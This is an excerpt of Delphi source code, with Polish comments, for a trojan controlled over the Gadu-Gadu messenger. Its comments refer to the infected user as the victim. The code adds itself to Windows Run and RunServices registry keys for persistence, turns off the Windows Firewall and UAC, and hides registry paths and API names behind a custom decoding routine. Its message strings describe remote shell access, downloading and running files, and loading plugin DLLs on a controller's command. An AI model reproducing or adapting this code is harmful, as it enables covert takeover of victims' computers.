...
{$DEFINE NOREADCONFIG}               { Blokada ładowania konfiguracji         }
...
const
 ...
 Prefix =                            { Prefix większości/wszystkich komend    } '#';
 Sep =                               { Znak separujący                        } '|';
 ...
 {KOMENDY}
 C_END =                             { Zakończa prace programu                } Prefix+'end';
 C_ON_CMD =                          { Uruchamia powłokę poleceń              } Prefix+'cmd on';
 C_OFF_CMD =                         { Wyłącza powłokę poleceń                } Prefix+'cmd off';
 ...
 C_INSTALL_PLUG =                    { Instalacja pluginów                    } Prefix+'pinstall';
 C_DEINSTALL_PLUG =                  { Deinstalacja pluginów                  } Prefix+'pdeinstall';
 C_LIST_PLUG =                       { Lista aktywnych pluginów               } Prefix+'plist';

 {NAZWY KONFIGURACJI}
 CG_GGC =                            { Klient                                 } 'client';
 CG_GGS =                            { Login serwera                          } 'server';
 CG_GGP =                            { Hasło do loginu serwera                } 'pass';
 CG_REG =                            { Sposób autostartu                      } 'reg';
 CG_HELLO =                          { Wiadomośc powitalna                    } 'hello';

 {ODPOWIEDZI}
 M_HELLO =                           { Wiadomość powitalna                    } ProgName+' v'+Version+' aktywny!'+#13#10+#13+'Info:'+#13+'Nazwa użytkownika ofiary: "%s"'+#13+'Skype: %s'+#13+'Gadu-Gadu: %s';
 M_MHELLO =                          { Wiadomość do numeru "mastera"          } 'tu.';
 M_END =                             { Odpowiedź zakończenia pracy programu   } 'Wyłączono.';
 M_ALERT =                           { Wiadomość, gdy ktoś niepowołany zagada } 'Uwaga! Osoba o numerze gg:%s'+#13+'Wysłała na numer serwera wiadomość:'+#13+'%s';
 M_ACCESS_DIE =                      { Nieautoryzowany numer Gadu-Gadu        } ProgName+' v'+Version+' - odmowa dostępu.';
 M_NO_COMMAND_HANDLE =               { Wiadomość, gdy niewłaściwe polecenie   } 'Nie rozpoznano polecenia.';
 M_STARTED_CMD =                     { Wiadomość, gdy CMD odpalone            } 'CMD zostało uruchomione.';
 M_STOPTED_CMD =                     { Wiadomość, gdy CMD zatrzymane          } 'CMD zostało wyłączone.';
 M_BEGIN_URL =                       { Gdy pobieranie się rozpocznie          } 'Pobieranie pliku:'+#13+'%s'+#13+'Zostało rozpoczęte.';
 M_END_URL =                         { Gdy pobieranie zostanie ukończone      } 'Pobieranie pliku zostało zakończone.'+#13+'Plik został zapisany do:'+#13+'%s';
 M_START_SUCCESS =                   { Gdy poprawnie uruchomiono plik         } 'Uruchomiono plik: "%s"';
 M_CONFIG =                          { Aktualnej konfiguracji                 } 'Numer serwera: %s'+#13+'Hasło serwera: %s'+#13+'Numer klienta: %s'+#13+'Typ rejestru: %s'+#13+'Ścieżka instalacji: %s'+#13+'Wiadomość powitalna: %s';
 M_CFG_SUCCESS =                     { Poprawnego skonfigurowania             } 'Zmieniono! Ustawienia wejdą w życie dopiero po ponownym uruchomieniu serwera.';
 M_RESTART =                         { Resetu trojana                         } 'Proszę czekać, trwa zapisywanie nowych ustawień, oraz ponowne uruchamianie.';
 M_SUCCESS_PLUG =                    { Gdy pomyślnie zainstalowano plugin     } 'Pomyślnie zainstalowano plugin.';
 M_DSUCCESS_PLUG =                   { Gdy usunięto plugin                    } 'Pomyślnie zdeinstalowano plugin.';

 {BŁĘDY}
 E_STARTED_CMD =                     { Błąd, gdy CMD jest już odpalone        } 'CMD zostało już uruchomione!';
 E_STOPTED_CMD =                     { Błąd, gdy CMD zatrzymane               } 'CMD jest wyłączone!';
 E_SYNTAX_URL =                      { Błąd, gdy składania URL niepoprawna    } 'Nieprawidłowa składnia polecenia.';
 E_DOWNLOAD_URL =                    { Błąd, gdy plik nie może zostać pobrany } 'Nie można pobrać:'+#13+'%s';
 E_SAVE_URL =                        { Błąd, gdy ścieżka zapisu jest zajęta   } 'Plik:'+#13+'%s'+#13+'już istnieje! Wybierz inną ścieżkę zapisu.';
 E_BUSSY_URL =                       { Błąd, gdy wątek URL jest zajęty        } 'Wątek pobierający plik z adresu URL, jest chwilowo zajęty!';
 E_WRONG_FILE =                      { Błąd, gdy wskazany plik jest błędny    } 'Błąd! Wskazany plik nie istnieje!';
 E_WRONG_VALUE =                     { Błąd, gdy wartość jest nieprawidłowa   } 'Podana wartość jest nieprawidłowa!';
 E_NO_PLUG =                         { Błąd, gdy brak pluginów                } 'Błąd! Aktualnie nie ma żadnych zainstalowanych pluginów.';
 E_EXISTS_ERROR_PLUG =               { Błąd, gdy plugin już istnieje          } 'Plugin jest już zainstalowany, lub jest niewłaściwy!';
 E_NOTEXISTS_PLUG =                  { Błąd, gdy plugin nieistnieje           } 'Plugin nieistnieje!';
 E_NOTDLL =                          { Błąd, gdy wskazany plik nie jest DLL   } 'Błąd! Wskazany plik nie jest biblioteką DLL!';
 E_NOT_INTEGER =                     { Gdy ciąg tekstowy nie jest liczbą      } 'Podaj numer ID pluginu!';
 E_WRONG_ID =                        { Błędne ID                              } 'Podane ID nie jest prawidłowe!';
...
var
 ...
 SockInfo:sockaddr_in;               { Pakiet informacji o gnieździe          }
 Connected:Boolean=False;            { Połączony tak/nie                      }
 Size:Integer;                       { Rozmiar otrzymanych pakietów           }
 RecvHeader:THeaderRec;              { Pakiet nagłówkowy, informacyjny        }
 RecvMsg:TRecvMsgRec;                { Pakiet odbiórkowy wiadomości           }
 NullString:String;                  { Pomocnicza odbioru wiadomości          }
 NullChar:Char;                      { Zmienna pomocnicza odbioru wiadomości  }
 ...
 CMDEnabled:Boolean=False;           { Zmienna kontrolująca CMD               }
 ThreadID,Sender:DWORD;              { Zmienna pomocnicza, CMD                }
 URLDownload:PURLDownloadRec;        { Pakiet przekazania danych do wątku URL }
 URLBussy:Boolean=False;             { Zmienna kontrolująca wątek URL         }
 P:Pointer;                          { Wskaźnik pakietu danych URL            }
 ...
 Path:String;                        { Ścieżka instalacyjna                   }
...
var
 H:HKey;
begin
 if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('ĆÂąÇĘ´Ĺ¸ĎĎşÔ×č şÔ×č')),0,KEY_READ,H) = ERROR_SUCCESS then Result:='zainstalowane' else Result:='brak';
end;
...
var
 H:HKey;
begin
 if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('ĆÂąÇĘ´Ĺ¸ĎĎĆŢěăŘ')),0,KEY_READ,H) = ERROR_SUCCESS then Result:='zainstalowane' else Result:='brak';
end;
...
begin
 Result:=1;
 DLL:=LoadLibrary(PChar(DeCode('ČĹżŔÂÁˇ·żż')));
  try
   @Func:=GetProcAddress(DLL, PChar(DeCode('ČĹż·âęáßâÔ×ÇâąÜßŘ´')));
   if @Func<>nil then
...
begin
 case RegInstall of
  1:
   ...
   if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('ĆÂąÇĘ´Ĺ¸ĎĎŔÜÖĺâćâŮçĎĎĘÜá×âęćĎĎ¶čĺĺŘáçÉŘĺćÜâáĎĎĹčá')),0,KEY_WRITE,H) = ERROR_SUCCESS then
    RegSetValueEx(H, PChar(ExtractFileName(Path)), 0, REG_SZ, PChar(Path), Length(Path)+1)
   else begin
    RegCreateKey(HKEY_LOCAL_MACHINE,PChar(DeCode('ĆÂąÇĘ´Ĺ¸ĎĎŔÜÖĺâćâŮçĎĎĘÜá×âęćĎĎ¶čĺĺŘáçÉŘĺćÜâáĎĎĹčá')),H);
    RegSetValueEx(H, PChar(ExtractFileName(Path)), 0, REG_SZ, PChar(Path), Length(Path)+1)
   end;
  2:
   // HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices
   if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('ĆÂąÇĘ´Ĺ¸ĎĎŔÜÖĺâćâŮçĎĎĘÜá×âęćĎĎ¶čĺĺŘáçÉŘĺćÜâáĎĎĹčáĆŘĺéÜÖŘć')),0,KEY_WRITE,H) = ERROR_SUCCESS then
    RegSetValueEx(H, PChar(ExtractFileName(Path)), 0, REG_SZ, PChar(Path), Length(Path)+1)
   else begin
    RegCreateKey(HKEY_LOCAL_MACHINE,PChar(DeCode('ĆÂąÇĘ´Ĺ¸ĎĎŔÜÖĺâćâŮçĎĎĘÜá×âęćĎĎ¶čĺĺŘáçÉŘĺćÜâáĎĎĹčáĆŘĺéÜÖŘć')),H);
    RegSetValueEx(H, PChar(ExtractFileName(Path)), 0, REG_SZ, PChar(Path), Length(Path)+1)
   end;
  3:
   // HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   if RegOpenKeyEx(HKEY_CURRENT_USER,PChar(DeCode('ĆâŮçęÔĺŘĎĎŔÜÖĺâćâŮçĎĎĘÜá×âęćĎĎ¶čĺĺŘáçÉŘĺćÜâáĎĎĹčá')),0,KEY_WRITE,H) = ERROR_SUCCESS then
    RegSetValueEx(H, PChar(ExtractFileName(Path)), 0, REG_SZ, PChar(Path), Length(Path)+1)
   else begin
    RegCreateKey(HKEY_CURRENT_USER,PChar(DeCode('ĆâŮçęÔĺŘĎĎŔÜÖĺâćâŮçĎĎĘÜá×âęćĎĎ¶čĺĺŘáçÉŘĺćÜâáĎĎĹčá')),H);
    RegSetValueEx(H, PChar(ExtractFileName(Path)), 0, REG_SZ, PChar(Path), Length(Path)+1)
   end;
 end;
end;
...
begin
 for I := 1 to 3 do begin
  case I of
   1:
    if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('ĆÂąÇĘ´Ĺ¸ĎĎŔÜÖĺâćâŮçĎĎĘÜá×âęćĎĎ¶čĺĺŘáçÉŘĺćÜâáĎĎĹčá')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then
     RegDeleteValue(H, PChar(ExtractFileName(Path)));
   2:
    if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('ĆÂąÇĘ´Ĺ¸ĎĎŔÜÖĺâćâŮçĎĎĘÜá×âęćĎĎ¶čĺĺŘáçÉŘĺćÜâáĎĎĹčáĆŘĺéÜÖŘć')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then
     RegDeleteValue(H, PChar(ExtractFileName(Path)));
   3:
    if RegOpenKeyEx(HKEY_CURRENT_USER,PChar(DeCode('ĆâŮçęÔĺŘĎĎŔÜÖĺâćâŮçĎĎĘÜá×âęćĎĎ¶čĺĺŘáçÉŘĺćÜâáĎĎĹčá')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then
     RegDeleteValue(H, PChar(ExtractFileName(Path)));
  end;
 end;
end;
...
const
 SHELL32_LIBARY = 'ćŰŘßß¦Ąˇ×ßß';
 SHELL_FUNCTION = 'ĆŰŘßß¸ëŘÖčçŘ´';
 SHELL_METHOD = 'âăŘá';
var
 DLL:THandle;
...
begin
 Enable:=0;
 if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('ĆâŮçęÔĺŘĎĎŔÜÖĺâćâŮçĎĎĘÜá×âęćĎĎ¶čĺĺŘáçÉŘĺćÜâáĎĎĂâßÜÖÜŘćĎĎĆěćçŘŕ')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then begin
  try
   RegSetValueEx(H, PChar(DeCode('¸áÔŐßŘżČ´')), 0, REG_DWORD, @Enable, SizeOf(Enable));
  finally
   RegCloseKey(H);
  end;
 end;
...
begin
 Enable:=0;
 if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('ĆĚĆÇ¸ŔĎĎ¶čĺĺŘáç¶âáçĺâßĆŘçĎĎĆŘĺéÜÖŘćĎĎĆŰÔĺŘ×´ÖÖŘććĎĎĂÔĺÔŕŘçŘĺćĎĎąÜĺŘęÔßßĂâßÜÖěĎĎĆçÔá×Ôĺ×ĂĺâŮÜßŘ')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then begin
  try
   RegSetValueEx(H, PChar(DeCode('¸áÔŐßŘąÜĺŘęÔßß')), 0, REG_DWORD, @Enable, SizeOf(Enable));
  finally
   RegCloseKey(H);
  end;
 end;
...
label ConnectionLost,                { Skok do re-połączenia                  }
      GoBack,                        { Skok na początek pętli odbioru         }
           ...
           if(RecvMsg._sender=GGMaster)or(RecvMsg._sender=GGClient)then begin
            ...
            if(Copy(NullString,1,Length(C_LIST_PLUG))=C_LIST_PLUG)then begin
             if(PlugHigh>0)then begin
              NullString:='Lista aktywnych pluginów:'+#13+#13#10;
